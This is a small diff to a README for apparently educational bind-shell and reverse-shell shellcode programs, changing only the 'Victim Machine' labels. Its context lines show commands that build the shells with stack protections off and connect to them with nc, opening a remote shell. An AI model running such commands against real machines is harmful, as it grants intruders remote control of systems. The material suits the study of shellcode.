@@ -14,7 +14,7 @@ Usage :
 => gcc shellcode_with_configurable_port.c -zexecstack -fno-stack-protector -o bind_shell
 => ./bind_shell <PORT_TO_BIND>
 
-In Victim Machine => ./bind_shell 9999 
+Victim Machine => ./bind_shell 9999 
 
 Attacker Machine => nc 127.0.0.1 9999
 
@@ -34,7 +34,7 @@ Usage example :
 
 Attacker Machine => nc -nlvp 8888
 
-In Victim Machine => ./reverse_shell 127.0.0.1 8888  
+Victim Machine => ./reverse_shell 127.0.0.1 8888  
 
 Blog : https://oxhat.blogspot.com/2018/04/coding-custom-tcp-reverse-shell.html
 ```
